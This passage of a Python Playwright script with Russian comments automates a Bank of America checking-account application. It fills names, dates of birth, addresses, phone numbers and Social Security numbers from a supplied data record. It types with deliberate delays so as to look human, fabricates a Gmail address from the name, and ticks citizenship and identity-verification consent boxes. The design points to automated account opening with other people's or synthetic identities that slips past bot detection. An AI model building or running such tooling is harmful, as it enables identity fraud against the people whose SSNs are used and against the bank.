                        # Выбираем первую опцию (не "Select")
                        first_option = options[1]  # Индекс 1, так как 0 - это "Select"
                        option_value = await first_option.get_attribute("value")
                        option_text = await first_option.text_content()
                        
                        print_info(f"Выбираю округ: {option_text}")
                        
                        # Выбираем опцию
                        await county_select.select_option(value=option_value)
                        print_success(f"✓ Выбран округ: {option_text}")
                        
                        # Ждем немного для обработки выбора
                        await page.wait_for_timeout(1000)
                        
                        # Ищем и нажимаем кнопку "Go" в модальном окне
                        go_button = await page.wait_for_selector("#go-button-county-modal", timeout=2000)
                        if go_button:
                            print_info("Нажимаю кнопку 'Go' в модальном окне округа...")
                            await go_button.click()
                            print_success("✓ Кнопка 'Go' нажата в модальном окне округа")
                            
                            # Ждем загрузки после нажатия кнопки
                            await page.wait_for_load_state("networkidle")
                        else:
                            print_warning("⚠️ Кнопка 'Go' в модальном окне округа не найдена")
                    else:
                        print_warning("⚠️ Нет доступных опций округа")
                else:
                    print_warning("⚠️ Селект округа не найден")
            else:
                print_info("✓ Модальное окно выбора округа не найдено, продолжаем...")
                
        except Exception as e:
            print_info("✓ Модальное окно выбора округа не найдено, продолжаем...")
        
        print_success("✓ Сайт Bank of America успешно открыт и ZIP-код введен")
        
        # Ждем немного для загрузки страницы после всех действий
        await page.wait_for_timeout(2000)
        
        # Проверяем, есть ли чекбокс для выбора типа аккаунта
        print_info("Проверяю наличие чекбокса выбора типа аккаунта...")
        
        try:
            # Ищем чекбокс "I only want a Bank of America Advantage SafeBalance Banking account"
            checkbox_selectors = [
                "input[id='rb-savings-account-none']",
                "input[name='optional-account-type'][value='']",
                "input.spa-input-option--radio[id*='savings-account-none']",
                "input[type='radio'][id*='savings-account-none']"
            ]
            
            checkbox_found = False
            for selector in checkbox_selectors:
                try:
                    checkbox = await page.wait_for_selector(selector, timeout=3000)
                    if checkbox:
                        print_success(f"✓ Найден чекбокс: {selector}")
                        
                        # Проверяем, не выбран ли уже чекбокс
                        is_checked = await checkbox.is_checked()
                        if not is_checked:
                            print_info("Нажимаю чекбокс 'I only want a Bank of America Advantage SafeBalance Banking account'...")
                            await checkbox.click()
                            print_success("✓ Чекбокс нажат")
                        else:
                            print_info("✓ Чекбокс уже выбран")
                        
                        checkbox_found = True
                        break
                except:
                    continue
            
            if not checkbox_found:
                print_warning("⚠️ Чекбокс выбора типа аккаунта не найден")
                
        except Exception as e:
            print_warning(f"⚠️ Ошибка при поиске чекбокса: {e}")
        
        # Ждем немного после нажатия чекбокса
        await page.wait_for_timeout(1000)
        
        # Ищем кнопку "Go to Application"
        print_info("Ищу кнопку 'Go to Application'...")
        
        try:
            # Ищем кнопку "Go to Application"
            application_button_selectors = [
                "a[id='go-to-application-mediumup']",
                "a.openNowButton",
                "a.spa-btn--primary:has-text('Go to Application')",
                "a[href='javascript:void(0);']:has-text('Go to Application')",
                "a.button:has-text('Go to Application')"
            ]
            
            application_button = None
            for selector in application_button_selectors:
                try:
                    application_button = await page.wait_for_selector(selector, timeout=3000)
                    if application_button:
                        print_success(f"✓ Найдена кнопка 'Go to Application': {selector}")
                        break
                except:
                    continue
            
            if application_button:
                print_info("Нажимаю кнопку 'Go to Application'...")
                await application_button.click()
                print_success("✓ Кнопка 'Go to Application' нажата")
                
                # Ждем загрузки после нажатия кнопки
                await page.wait_for_load_state("networkidle")
                print_success("✓ Переход на страницу заявки выполнен")
            else:
                print_warning("⚠️ Кнопка 'Go to Application' не найдена")
                
        except Exception as e:
            print_warning(f"⚠️ Ошибка при поиске кнопки 'Go to Application': {e}")
        
        print_success("✓ Автоматизация Bank of America завершена успешно")
        
        # Ждем немного для загрузки страницы заявки
        await page.wait_for_timeout(3000)
        
        # Заполняем форму заявки
        print_info("Заполняю форму заявки...")
        
        # Заполняем имя
        try:
            first_name_input = await page.wait_for_selector("#zz_name_tb_fnm_v_1", timeout=5000)
            if first_name_input:
                first_name = user_data.get("first_name", "")
                if first_name:
                    print_info(f"Ввожу имя: {first_name}")
                    await first_name_input.fill("")
                    await first_name_input.type(first_name, delay=150)  # Задержка для имитации человека
                    print_success(f"✓ Имя введено: {first_name}")
                else:
                    print_warning("⚠️ Имя не найдено в данных пользователя")
            else:
                print_warning("⚠️ Поле имени не найдено")
        except Exception as e:
            print_warning(f"⚠️ Ошибка при вводе имени: {e}")
        
        # Ждем немного между полями
        await page.wait_for_timeout(1000)
        
        # Заполняем фамилию
        try:
            last_name_input = await page.wait_for_selector("#zz_name_tb_lnm_v_1", timeout=5000)
            if last_name_input:
                last_name = user_data.get("last_name", "")
                if last_name:
                    print_info(f"Ввожу фамилию: {last_name}")
                    await last_name_input.fill("")
                    await last_name_input.type(last_name, delay=150)  # Задержка для имитации человека
                    print_success(f"✓ Фамилия введена: {last_name}")
                else:
                    print_warning("⚠️ Фамилия не найдена в данных пользователя")
            else:
                print_warning("⚠️ Поле фамилии не найдено")
        except Exception as e:
            print_warning(f"⚠️ Ошибка при вводе фамилии: {e}")
        
        # Ждем немного между полями
        await page.wait_for_timeout(1000)
        
        # Заполняем дату рождения
        try:
            dob_input = await page.wait_for_selector("#zz_citz_tb_dob_search_v_1", timeout=5000)
            if dob_input:
                # Используем DOB из файла, если он есть
                dob_from_file = user_data.get("dob_from_file", "")
                
                if dob_from_file:
                    print_info(f"Ввожу дату рождения из файла: {dob_from_file}")
                    await dob_input.fill("")
                    await dob_input.type(dob_from_file, delay=200)  # Больше задержки для даты
                    print_success(f"✓ Дата рождения введена: {dob_from_file}")
                else:
                    # Fallback: форматируем дату рождения из текста в формат MM/DD/YYYY
                    birth_month = user_data.get("birth_month", "")
                    birth_year = user_data.get("birth_year", "")
                    
                    if birth_month and birth_year:
                        # Конвертируем месяц в число
                        month_map = {
                            "January": "01", "February": "02", "March": "03", "April": "04",
                            "May": "05", "June": "06", "July": "07", "August": "08",
                            "September": "09", "October": "10", "November": "11", "December": "12"
                        }
                        
                        month_num = month_map.get(birth_month, "01")
                        day_num = "15"  # Используем 15-е число как стандарт
                        
                        dob_formatted = f"{month_num}/{day_num}/{birth_year}"
                        
                        print_info(f"Ввожу дату рождения из текста: {dob_formatted}")
                        await dob_input.fill("")
                        await dob_input.type(dob_formatted, delay=200)  # Больше задержки для даты
                        print_success(f"✓ Дата рождения введена: {dob_formatted}")
                    else:
                        print_warning("⚠️ Дата рождения не найдена в данных пользователя")
            else:
                print_warning("⚠️ Поле даты рождения не найдено")
        except Exception as e:
            print_warning(f"⚠️ Ошибка при вводе даты рождения: {e}")
        
        # Ждем немного после заполнения всех полей
        await page.wait_for_timeout(2000)
        
        # Заполняем адрес
        try:
            address_input = await page.wait_for_selector("#zz_addr_tb_line1_v_1", timeout=5000)
            if address_input:
                address = user_data.get("address", "")
                if address:
                    print_info(f"Ввожу адрес: {address}")
                    await address_input.fill("")
                    await address_input.type(address, delay=150)
                    print_success(f"✓ Адрес введен: {address}")
                else:
                    print_warning("⚠️ Адрес не найден в данных пользователя")
            else:
                print_warning("⚠️ Поле адреса не найдено")
        except Exception as e:
            print_warning(f"⚠️ Ошибка при вводе адреса: {e}")
        
        # Ждем немного между полями
        await page.wait_for_timeout(1000)
        
        # Заполняем город
        try:
            city_input = await page.wait_for_selector("#zz_addr_tb_city_v_1", timeout=5000)
            if city_input:
                city = user_data.get("city", "")
                if city:
                    print_info(f"Ввожу город: {city}")
                    await city_input.fill("")
                    await city_input.type(city, delay=150)
                    print_success(f"✓ Город введен: {city}")
                else:
                    print_warning("⚠️ Город не найден в данных пользователя")
            else:
                print_warning("⚠️ Поле города не найдено")
        except Exception as e:
            print_warning(f"⚠️ Ошибка при вводе города: {e}")
        
        # Ждем немного между полями
        await page.wait_for_timeout(1000)
        
        # Заполняем номер телефона
        try:
            phone_input = await page.wait_for_selector("#zz_phn_tb_ppno_v_1", timeout=5000)
            if phone_input:
                phone = user_data.get("phone", "")
                if phone:
                    print_info(f"Ввожу номер телефона: {phone}")
                    await phone_input.fill("")
                    await phone_input.type(phone, delay=150)
                    print_success(f"✓ Номер телефона введен: {phone}")
                else:
                    print_warning("⚠️ Номер телефона не найден в данных пользователя")
            else:
                print_warning("⚠️ Поле номера телефона не найдено")
        except Exception as e:
            print_warning(f"⚠️ Ошибка при вводе номера телефона: {e}")
        
        # Ждем немного между полями
        await page.wait_for_timeout(1000)
        
        # Генерируем email на основе имени и фамилии
        first_name = user_data.get("first_name", "").lower()
        last_name = user_data.get("last_name", "").lower()
        email = f"{first_name}.{last_name}@gmail.com"
        
        # Заполняем email (первое поле)
        try:
            email_input = await page.wait_for_selector("#zz_email_tb_addr_search_v_1", timeout=5000)
            if email_input:
                print_info(f"Ввожу email: {email}")
                await email_input.fill("")
                await email_input.type(email, delay=150)
                print_success(f"✓ Email введен: {email}")
            else:
                print_warning("⚠️ Поле email не найдено")
        except Exception as e:
            print_warning(f"⚠️ Ошибка при вводе email: {e}")
        
        # Ждем немного между полями
        await page.wait_for_timeout(1000)
        
        # Заполняем email (второе поле - подтверждение)
        try:
            email_confirm_input = await page.wait_for_selector("#zz_email_tb_readdr_search_v_1", timeout=5000)
            if email_confirm_input:
                print_info(f"Ввожу подтверждение email: {email}")
                await email_confirm_input.fill("")
                await email_confirm_input.type(email, delay=150)
                print_success(f"✓ Подтверждение email введено: {email}")
            else:
                print_warning("⚠️ Поле подтверждения email не найдено")
        except Exception as e:
            print_warning(f"⚠️ Ошибка при вводе подтверждения email: {e}")
        
        # Ждем немного после заполнения всех полей
        await page.wait_for_timeout(2000)

        # Нажимаем чекбокс "I am a U.S. citizen"
        try:
            us_citizen_checkbox = await page.wait_for_selector("#zz_citz_lb_uscit_yes_v_1-real", timeout=5000)
            if us_citizen_checkbox:
                print_info("Нажимаю чекбокс 'I am a U.S. citizen'")
                await us_citizen_checkbox.click()
                print_success("✓ Чекбокс 'I am a U.S. citizen' нажат")
            else:
                print_warning("⚠️ Чекбокс 'I am a U.S. citizen' не найден")
        except Exception as e:
            print_warning(f"⚠️ Ошибка при нажатии чекбокса 'I am a U.S. citizen': {e}")

        # Ждем немного между полями
        await page.wait_for_timeout(1000)

        # Вставляем SSN в первое поле
        try:
            ssn_input = await page.wait_for_selector("#zz_citz_tb_ssn_v_1", timeout=5000)
            if ssn_input:
                ssn = user_data.get("ssn", "")
                if ssn:
                    print_info(f"Вставляю SSN в первое поле: {ssn}")
                    await ssn_input.fill("")
                    await ssn_input.type(ssn, delay=150)
                    print_success(f"✓ SSN вставлен в первое поле: {ssn}")
                else:
                    print_warning("⚠️ SSN не найден в данных пользователя")
            else:
                print_warning("⚠️ Поле SSN не найдено")
        except Exception as e:
            print_warning(f"⚠️ Ошибка при вставке SSN в первое поле: {e}")

        # Ждем немного между полями
        await page.wait_for_timeout(1000)

        # Вставляем SSN во второе поле
        try:
            ssn_input_2 = await page.wait_for_selector("#zz_citz_tb_ssn_2_v_1", timeout=5000)
            if ssn_input_2:
                ssn = user_data.get("ssn", "")
                if ssn:
                    print_info(f"Вставляю SSN во второе поле: {ssn}")
                    await ssn_input_2.fill("")
                    await ssn_input_2.type(ssn, delay=150)
                    print_success(f"✓ SSN вставлен во второе поле: {ssn}")
                else:
                    print_warning("⚠️ SSN не найден в данных пользователя")
            else:
                print_warning("⚠️ Второе поле SSN не найдено")
        except Exception as e:
            print_warning(f"⚠️ Ошибка при вставке SSN во второе поле: {e}")

        # Ждем немного между полями
        await page.wait_for_timeout(1000)

        # Нажимаем чекбокс "I am not a dual citizen"
        try:
            dual_citizen_checkbox = await page.wait_for_selector("#zz_citz_lb_dualcit_no_v_1-real", timeout=5000)
            if dual_citizen_checkbox:
                print_info("Нажимаю чекбокс 'I am not a dual citizen'")
                await dual_citizen_checkbox.click()
                print_success("✓ Чекбокс 'I am not a dual citizen' нажат")
            else:
                print_warning("⚠️ Чекбокс 'I am not a dual citizen' не найден")
        except Exception as e:
            print_warning(f"⚠️ Ошибка при нажатии чекбокса 'I am not a dual citizen': {e}")

        await page.wait_for_timeout(2000)
        
        # Выбираем страну из выпадающего списка
        print_info("Выбираю страну из выпадающего списка...")
        country_selected = await select_country_from_dropdown(page, user_data)
        if country_selected:
            print_success("✓ Страна выбрана успешно")
        else:
            print_warning("⚠️ Не удалось выбрать страну")
        
        # Выбираем статус занятости из выпадающего списка
        print_info("Выбираю статус занятости из выпадающего списка...")
        employment_selected = await select_employment_status(page, user_data)
        if employment_selected:
            print_success("✓ Статус занятости выбран успешно")
        else:
            print_warning("⚠️ Не удалось выбрать статус занятости")
        
        # Выбираем источник дохода из выпадающего списка
        print_info("Выбираю источник дохода из выпадающего списка...")
        source_income_selected = await select_source_of_income(page, user_data)
        if source_income_selected:
            print_success("✓ Источник дохода выбран успешно")
        else:
            print_warning("⚠️ Не удалось выбрать источник дохода")
        
        # Выбираем профессию из выпадающего списка
        print_info("Выбираю профессию из выпадающего списка...")
        occupation_selected = await select_occupation(page, user_data)
        if occupation_selected:
            print_success("✓ Профессия выбрана успешно")
        else:
            print_warning("⚠️ Не удалось выбрать профессию")
        
        print_success("✓ Форма заявки заполнена")
        
        # Заполняем дополнительные поля после выбора Employment Income
        print_info("Заполняю дополнительные поля...")
        
        # Заполняем поле "Employer Name" (self-employed)
        try:
            # Пробуем разные селекторы для поля работодателя
            employer_input_selectors = [
                "#zz_emp_tb_emp_v_1",
                "input[name='zz_emp_tb_emp']",
                "input[id*='emp_tb_emp']",
                "input[name*='emp_tb_emp']",
                "input[type='text'][id*='emp']",
                "input[type='text'][name*='emp']"
            ]
            
            employer_input = None
            for selector in employer_input_selectors:
                try:
                    employer_input = await page.wait_for_selector(selector, timeout=3000)
                    if employer_input:
                        print_success(f"✓ Найдено поле работодателя: {selector}")
                        break
                except:
                    continue
            
            if employer_input:
                print_info("Ввожу название работодателя: self-employed")
                await employer_input.fill("")
                await employer_input.type("self-employed", delay=150)
                print_success("✓ Название работодателя введено: self-employed")
            else:
                print_warning("⚠️ Поле названия работодателя не найдено")
        except Exception as e:
            print_warning(f"⚠️ Ошибка при вводе названия работодателя: {e}")
        
        # Ждем немного между полями
        await page.wait_for_timeout(1000)
        
        # Заполняем поле номера телефона
        try:
            # Пробуем разные селекторы для поля номера телефона
            phone_input_selectors = [
                "#zz_emp_tb_wno_v_2",
                "input[name='zz_emp_tb_wno']",
                "input[id*='emp_tb_wno']",
                "input[name*='emp_tb_wno']",
                "input[type='tel']",
                "input[autocomplete='tel-national']",
                "input[data-field-type='phonePrefill']"
            ]
            
            phone_input = None
            for selector in phone_input_selectors:
                try:
                    phone_input = await page.wait_for_selector(selector, timeout=3000)
                    if phone_input:
                        print_success(f"✓ Найдено поле номера телефона: {selector}")
                        break
                except:
                    continue
            
            if phone_input:
                phone = user_data.get("phone", "")
                if phone:
                    print_info(f"Ввожу номер телефона: {phone}")
                    await phone_input.fill("")
                    await phone_input.type(phone, delay=150)
                    print_success(f"✓ Номер телефона введен: {phone}")
                else:
                    print_warning("⚠️ Номер телефона не найден в данных пользователя")
            else:
                print_warning("⚠️ Поле номера телефона не найдено")
        except Exception as e:
            print_warning(f"⚠️ Ошибка при вводе номера телефона: {e}")
        
        # Ждем немного между полями
        await page.wait_for_timeout(1000)
        
        # Нажимаем чекбокс согласия
        try:
            # Пробуем разные селекторы для чекбокса согласия
            consent_checkbox_selectors = [
                "#zz_idvEws_PrimaryConsent_v_1-real",
                "input[name='zz_idvEws_PrimaryConsent']",
                "input[type='checkbox'][id*='PrimaryConsent']",
                "input[type='checkbox'][name*='PrimaryConsent']",
                "input[type='checkbox'][id*='Consent']",
                "input[type='checkbox'][name*='Consent']"
            ]
            
            consent_checkbox = None
            for selector in consent_checkbox_selectors:
                try:
                    consent_checkbox = await page.wait_for_selector(selector, timeout=3000)
                    if consent_checkbox:
                        print_success(f"✓ Найден чекбокс согласия: {selector}")
                        break
                except:
                    continue
            
            if consent_checkbox:
                print_info("Нажимаю чекбокс согласия...")
                await consent_checkbox.click()
                print_success("✓ Чекбокс согласия нажат")
            else:
                print_warning("⚠️ Чекбокс согласия не найден")
        except Exception as e:
            print_warning(f"⚠️ Ошибка при нажатии чекбокса согласия: {e}")
        
        # Ждем немного после нажатия чекбокса
        await page.wait_for_timeout(1000)
        
        # Нажимаем кнопку Continue
        try:
            # Пробуем разные селекторы для кнопки Continue
            continue_button_selectors = [
                "#vPkC_2",
                "a[name='btn_continue']",
                "a.button.primary:has-text('Continue')",
                "a[href='javascript:;']:has-text('Continue')",
                "a.button:has-text('Continue')",
                "button:has-text('Continue')",
                "input[type='submit'][value*='Continue']"
            ]
            
            continue_button = None
            for selector in continue_button_selectors:
                try:
                    continue_button = await page.wait_for_selector(selector, timeout=3000)
                    if continue_button:
                        print_success(f"✓ Найдена кнопка Continue: {selector}")
                        break
                except:
                    continue
            
            if continue_button:
                print_info("Нажимаю кнопку Continue...")
                await continue_button.click()
                print_success("✓ Кнопка Continue нажата")
                
                # Ждем загрузки после нажатия кнопки
                await page.wait_for_load_state("networkidle")
                print_success("✓ Переход на следующую страницу выполнен")
            else:
                print_warning("⚠️ Кнопка Continue не найдена")
        except Exception as e:
            print_warning(f"⚠️ Ошибка при нажатии кнопки Continue: {e}")
        
        print_success("✓ Все дополнительные поля заполнены")
        
        return {"success": True}
            
    except Exception as e:
        print_error(f"Ошибка при автоматизации Bank of America: {e}")
        import traceback
        traceback.print_exc()
        return {"success": False, "error": str(e)}

# Функции для автоматизации Bank of America отключены по запросу пользователя
async def select_country_from_dropdown(page, user_data):
    """
    Выбирает страну из выпадающего списка
    
    Args:
        page: Playwright page object
        user_data: Данные пользователя
        
    Returns:
        bool: True если выбор успешен, False в противном случае
    """
    try:
        print_info("🔍 Поиск выпадающего списка страны...")
        
        # Ждем появления элемента
        await page.wait_for_timeout(2000)
        
        # Селекторы для select элемента страны
        country_select_selectors = [
            'select#zz_addr_lb_rescty_v_1',
            'select[name="zz_addr_lb_rescty"]',
            'select.z-xrlistbox[name="zz_addr_lb_rescty"]',
            'select[aria-describedby*="zz_addr_lb_rescty_v_1"]',
            'select[id*="rescty"]',
            'select[name*="country"]',
            'select[id*="country"]'
        ]
        
        country_select = None
        for selector in country_select_selectors:
            country_select = await page.query_selector(selector)
            if country_select:
                print_info(f"✓ Найден select элемент страны: {selector}")
                break
        
        if not country_select:
            print_warning("⚠️ Select элемент страны не найден")
            return False
        
        # Проверяем видимость и активность элемента
        is_visible = await country_select.is_visible()
        is_enabled = await country_select.is_enabled()
        
        print_info(f"Элемент видим: {is_visible}, активен: {is_enabled}")
        
        if not is_visible or not is_enabled:
            print_warning("⚠️ Элемент не видим или не активен")
            return False
        
        # Пытаемся прокрутить элемент в поле зрения
        try:
            await country_select.scroll_into_view_if_needed()
            print_info("✓ Элемент прокручен в поле зрения")
        except Exception as e:
            print_warning(f"⚠️ Не удалось прокрутить элемент: {e}")
        
        # Ждем немного после прокрутки
        await page.wait_for_timeout(1000)
        
        # Попытка выбора United States по значению
        try:
            await country_select.select_option(value="1000249")
            print_success("✓ United States выбран по значению")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать по значению: {e}")
        
        # Попытка выбора по тексту
        try:
            await country_select.select_option(label="United States")
            print_success("✓ United States выбран по тексту")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать по тексту: {e}")
        
        # Попытка выбора по индексу (обычно United States первый)
        try:
            await country_select.select_option(index=0)
            print_success("✓ United States выбран по индексу")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать по индексу: {e}")
        
        # JavaScript fallback
        try:
            await page.evaluate("""
                const select = document.querySelector('select#zz_addr_lb_rescty_v_1');
                select.value = '1000249';
                select.dispatchEvent(new Event('change', { bubbles: true }));
            """)
            print_success("✓ United States выбран через JavaScript")
            return True
        except Exception as e:
            print_warning(f"⚠️ JavaScript fallback не сработал: {e}")
        
        print_error("❌ Не удалось выбрать страну")
        return False
        
    except Exception as e:
        print_error(f"❌ Ошибка при выборе страны: {e}")
        return False

# Функция для автоматизации Bank of America - отключена
async def select_employment_status(page, user_data):
    """
    Выбирает статус занятости из выпадающего списка
    
    Args:
        page: Playwright page object
        user_data: Данные пользователя
        
    Returns:
        bool: True если выбор успешен, False в противном случае
    """
    try:
        print_info("🔍 Поиск выпадающего списка статуса занятости...")
        
        # Ждем появления элемента
        await page.wait_for_timeout(2000)
        
        # Селекторы для select элемента статуса занятости
        employment_select_selectors = [
            'select#zz_emp_lb_empstat_v_1',
            'select[name="zz_emp_lb_empstat"]',
            'select.z-xrlistbox[name="zz_emp_lb_empstat"]',
            'select[aria-describedby*="zz_emp_lb_empstat_v_1"]',
            'select[id*="empstat"]',
            'select[name*="employment"]',
            'select[id*="employment"]'
        ]
        
        employment_select = None
        for selector in employment_select_selectors:
            employment_select = await page.query_selector(selector)
            if employment_select:
                print_info(f"✓ Найден select элемент статуса занятости: {selector}")
                break
        
        if not employment_select:
            print_warning("⚠️ Select элемент статуса занятости не найден")
            return False
        
        # Проверяем видимость и активность элемента
        is_visible = await employment_select.is_visible()
        is_enabled = await employment_select.is_enabled()
        
        print_info(f"Элемент видим: {is_visible}, активен: {is_enabled}")
        
        if not is_visible or not is_enabled:
            print_warning("⚠️ Элемент не видим или не активен")
            return False
        
        # Пытаемся прокрутить элемент в поле зрения
        try:
            await employment_select.scroll_into_view_if_needed()
            print_info("✓ Элемент прокручен в поле зрения")
        except Exception as e:
            print_warning(f"⚠️ Не удалось прокрутить элемент: {e}")
        
        # Ждем немного после прокрутки
        await page.wait_for_timeout(1000)
        
        # Попытка выбора Employed по значению
        try:
            await employment_select.select_option(value="Employed")
            print_success("✓ Employed выбран по значению")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать по значению: {e}")
        
        # Попытка выбора по тексту
        try:
            await employment_select.select_option(label="Employed")
            print_success("✓ Employed выбран по тексту")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать по тексту: {e}")
        
        # Попытка выбора по индексу (обычно Employed первый)
        try:
            await employment_select.select_option(index=0)
            print_success("✓ Employed выбран по индексу")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать по индексу: {e}")
        
        # JavaScript fallback
        try:
            await page.evaluate("""
                const select = document.querySelector('select#zz_emp_lb_empstat_v_1');
                select.value = 'Employed';
                select.dispatchEvent(new Event('change', { bubbles: true }));
            """)
            print_success("✓ Employed выбран через JavaScript")
            return True
        except Exception as e:
            print_warning(f"⚠️ JavaScript fallback не сработал: {e}")
        
        print_error("❌ Не удалось выбрать статус занятости")
        return False
        
    except Exception as e:
        print_error(f"❌ Ошибка при выборе статуса занятости: {e}")
        return False

# Функция для автоматизации Bank of America - отключена
async def select_source_of_income(page, user_data):
    """
    Выбирает "Employment Income" из выпадающего списка "Source of income"
    
    Args:
        page: Playwright page object
        user_data: Данные пользователя
        
    Returns:
        bool: True если выбор успешен, False в противном случае
    """
    try:
        print_info("🔍 Поиск выпадающего списка 'Source of income'...")
        
        # Ждем появления элемента
        await page.wait_for_timeout(2000)
        
        # Селекторы для select элемента
        select_selectors = [
            'select#zz_emp_lb_srcinc_v_1',
            'select[name="zz_emp_lb_srcinc"]',
            'select.z-xrlistbox[name="zz_emp_lb_srcinc"]',
            'select[aria-describedby*="zz_emp_lb_srcinc_v_1"]'
        ]
        
        select_element = None
        for selector in select_selectors:
            select_element = await page.query_selector(selector)
            if select_element:
                print_info(f"✓ Найден select элемент: {selector}")
                break
        
        if not select_element:
            print_warning("⚠️ Select элемент не найден")
            return False
        
        # Проверяем видимость и активность элемента
        is_visible = await select_element.is_visible()
        is_enabled = await select_element.is_enabled()
        
        print_info(f"Элемент видим: {is_visible}, активен: {is_enabled}")
        
        if not is_visible or not is_enabled:
            print_warning("⚠️ Элемент не видим или не активен")
            return False
        
        # Пытаемся прокрутить элемент в поле зрения
        try:
            await select_element.scroll_into_view_if_needed()
            print_info("✓ Элемент прокручен в поле зрения")
        except Exception as e:
            print_warning(f"⚠️ Не удалось прокрутить элемент: {e}")
        
        # Ждем немного после прокрутки
        await page.wait_for_timeout(1000)
        
        # Попытка выбора по значению (правильное значение из HTML)
        try:
            await select_element.select_option(value="EmploymentIncome")
            print_success("✓ Employment Income выбран по значению")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать по значению: {e}")
        
        # Попытка выбора по тексту
        try:
            await select_element.select_option(label="Employment Income")
            print_success("✓ Employment Income выбран по тексту")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать по тексту: {e}")
        
        # Попытка выбора по индексу (Employment Income обычно второй элемент)
        try:
            await select_element.select_option(index=1)
            print_success("✓ Employment Income выбран по индексу")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать по индексу: {e}")
        
        # Попытка выбора через page.select_option (более надежный метод)
        try:
            await page.select_option('select#zz_emp_lb_srcinc_v_1', 'EmploymentIncome')
            print_success("✓ Employment Income выбран через page.select_option")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать через page.select_option: {e}")
        
        # JavaScript fallback
        try:
            await page.evaluate("""
                const select = document.querySelector('select#zz_emp_lb_srcinc_v_1');
                select.value = 'EmploymentIncome';
                select.dispatchEvent(new Event('change', { bubbles: true }));
            """)
            print_success("✓ Employment Income выбран через JavaScript")
            return True
        except Exception as e:
            print_warning(f"⚠️ JavaScript fallback не сработал: {e}")
        
        print_error("❌ Не удалось выбрать Employment Income")
        return False
        
    except Exception as e:
        print_error(f"❌ Ошибка при выборе Employment Income: {e}")
        return False

# Функция для автоматизации Bank of America - отключена
async def select_occupation(page, user_data):
    """
    Выбирает профессию из выпадающего списка
    
    Args:
        page: Playwright page object
        user_data: Данные пользователя
        
    Returns:
        bool: True если выбор успешен, False в противном случае
    """
    try:
        print_info("🔍 Поиск выпадающего списка профессии...")
        
        # Ждем появления элемента
        await page.wait_for_timeout(2000)
        
        # Селекторы для select элемента профессии
        occupation_select_selectors = [
            'select#zz_emp_lb_occ_v_1',
            'select[name="zz_emp_lb_occ"]',
            'select.z-xrlistbox[name="zz_emp_lb_occ"]',
            'select[aria-describedby*="zz_emp_lb_occ_v_1"]',
            'select[id*="occ"]',
            'select[name*="occupation"]',
            'select[id*="occupation"]'
        ]
        
        occupation_select = None
        for selector in occupation_select_selectors:
            occupation_select = await page.query_selector(selector)
            if occupation_select:
                print_info(f"✓ Найден select элемент профессии: {selector}")
                break
        
        if not occupation_select:
            print_warning("⚠️ Select элемент профессии не найден")
            return False
        
        # Проверяем видимость и активность элемента
        is_visible = await occupation_select.is_visible()
        is_enabled = await occupation_select.is_enabled()
        
        print_info(f"Элемент видим: {is_visible}, активен: {is_enabled}")
        
        if not is_visible or not is_enabled:
            print_warning("⚠️ Элемент не видим или не активен")
            return False
        
        # Пытаемся прокрутить элемент в поле зрения
        try:
            await occupation_select.scroll_into_view_if_needed()
            print_info("✓ Элемент прокручен в поле зрения")
        except Exception as e:
            print_warning(f"⚠️ Не удалось прокрутить элемент: {e}")
        
        # Ждем немного после прокрутки
        await page.wait_for_timeout(1000)
        
        # Попытка выбора Self-Employed по значению
        try:
            await occupation_select.select_option(value="SelfEmployed")
            print_success("✓ Self-Employed выбран по значению")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать по значению: {e}")
        
        # Попытка выбора по тексту
        try:
            await occupation_select.select_option(label="Self-Employed")
            print_success("✓ Self-Employed выбран по тексту")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать по тексту: {e}")
        
        # Попытка выбора по индексу
        try:
            await occupation_select.select_option(index=0)
            print_success("✓ Self-Employed выбран по индексу")
            return True
        except Exception as e:
            print_warning(f"⚠️ Не удалось выбрать по индексу: {e}")
        
        # JavaScript fallback
        try:
            await page.evaluate("""
                const select = document.querySelector('select#zz_emp_lb_occ_v_1');
                select.value = 'SelfEmployed';
                select.dispatchEvent(new Event('change', { bubbles: true }));
            """)
            print_success("✓ Self-Employed выбран через JavaScript")
            return True
        except Exception as e:
            print_warning(f"⚠️ JavaScript fallback не сработал: {e}")
        
        print_error("❌ Не удалось выбрать профессию")
        return False
        
    except Exception as e:
        print_error(f"❌ Ошибка при выборе профессии: {e}")
        return False

# Функция для автоматизации Bank of America - отключена
async def fill_boa_registration_form(page, user_data):
    """
    Заполняет форму регистрации Bank of America
    
    Args:
        page: Playwright page object
        user_data (dict): Данные пользователя
        
    Returns:
        dict: Результат заполнения формы
    """
    try:
        print_info("Заполняю форму регистрации Bank of America...")
        
        # Список селекторов для полей формы
        field_selectors = {
            "first_name": [
                "input[name*='firstName']",
                "input[name*='first_name']",
                "input[id*='firstName']",
                "input[id*='first_name']",
                "input[placeholder*='First']",
                "input[placeholder*='first']"
            ],
            "last_name": [
                "input[name*='lastName']",
                "input[name*='last_name']",
                "input[id*='lastName']",
                "input[id*='last_name']",
                "input[placeholder*='Last']",
                "input[placeholder*='last']"
            ],
            "email": [
                "input[type='email']",
                "input[name*='email']",
                "input[id*='email']",
                "input[placeholder*='Email']",
                "input[placeholder*='email']"
            ],
            "phone": [
                "input[name*='phone']",
                "input[id*='phone']",
                "input[type='tel']",
                "input[placeholder*='Phone']",
                "input[placeholder*='phone']"
            ],
            "address": [
                "input[name*='address']",
                "input[id*='address']",
                "input[placeholder*='Address']",
                "input[placeholder*='address']"
            ],
            "city": [
                "input[name*='city']",
                "input[id*='city']",
                "input[placeholder*='City']",
                "input[placeholder*='city']"
            ],
            "state": [
                "select[name*='state']",
                "select[id*='state']",
                "input[name*='state']",
                "input[id*='state']"
            ],
            "zip": [
                "input[name*='zip']",
                "input[name*='postal']",
                "input[id*='zip']",
                "input[id*='postal']",
                "input[placeholder*='ZIP']",
                "input[placeholder*='zip']"
            ],
            "ssn": [
                "input[name*='ssn']",
                "input[id*='ssn']",
